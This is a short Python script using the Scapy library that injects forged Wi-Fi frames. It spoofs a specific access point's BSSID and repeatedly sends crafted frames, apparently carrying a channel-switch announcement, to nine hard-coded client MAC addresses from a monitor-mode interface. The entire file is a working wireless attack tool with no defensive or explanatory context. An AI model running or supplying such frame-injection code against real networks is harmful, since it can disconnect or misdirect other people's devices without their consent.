from scapy.all import *
import binascii


def sendData(iface, bssid, sta):
    print'Sending Data to ' + sta + ' on iface ' + iface + ' with BSSID: ' + bssid

    #data = RadioTap() / binascii.unhexlify('08420000ffffffffffff6466b354cbc4902b349e019f3032ff080060000000009042cecd209254cf0d384b9e8d804f976bd158a84fbb43356a2f82053da91b4e3d49e06783d5833a7f1959182b5d45ec35390cde3ce0a7b0cb1f46281ac3')
    channel = 120
    old_channel = 120
    data = RadioTap() / Dot11(type=2, subtype=8, addr1=sta, addr2=bssid, addr3=bssid, FCfield = "from-DS") / binascii.unhexlify('3bc0904f00000000640001000005424947415001088c129824b048606c0301'+ hex(old_channel).replace("0x", "")+'050400020000070c44452024081464051a84031a2d1a0c001bffff0000000000000000000001000000000000000000003d162c0004000000000000000000000000000000000000007f080000000000000040dd180050f2020101800003a4000027a4000042435d0062322e00dd06aaaaaa3f4325dd14aaaaaa8020544b4e2d4c6f57532d53797374656ddd06aaaaaa215a01250300' + hex(channel).replace("0x", "") + '00')

    sendp(data, iface=iface)
    return "OK"

for x in range(0, 200):
    for i in range(0, 9):
        sendData('mon0', 'e0:91:f5:3e:97:f5', 'dc:85:de:10:af:7'+str(i) )
